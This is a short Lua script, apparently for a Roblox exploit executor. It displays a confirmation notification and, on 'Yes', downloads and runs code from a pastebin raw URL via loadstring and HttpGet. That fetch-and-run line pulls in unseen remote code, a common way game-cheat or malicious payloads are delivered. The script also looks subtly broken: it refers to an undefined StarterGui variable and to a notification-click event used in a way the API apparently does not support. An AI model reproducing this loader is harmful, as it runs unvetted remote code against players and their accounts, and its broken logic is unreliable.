game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "MAKE SURE";
    Text = "Are you want to run script?";
    Duration = math.huge;
    Button1 = "Yes";
    Button2 = "No";
})

StarterGui.NotificationClicked:Connect(function(button)
    if button == "Yes" then
        loadstring(game:HttpGet("https://pastebin.com/raw/LY6USwN2"))()
    end
end)
